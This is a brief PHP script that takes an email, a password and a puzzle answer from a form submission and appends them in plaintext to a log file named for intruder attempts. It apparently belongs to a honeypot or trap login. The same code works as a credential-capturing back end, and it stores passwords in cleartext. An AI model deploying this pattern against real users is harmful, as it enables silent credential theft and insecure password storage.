<?php
$email = $_POST['email'] ?? '';
$senha = $_POST['senha'] ?? '';
$enigma = $_POST['enigma'] ?? '';
$data = date('Y-m-d H:i:s');

$linha = "$data - Email: $email | Senha: $senha | Enigma: $enigma\n";
file_put_contents('tentativa_invasores.log', $linha, FILE_APPEND);
?>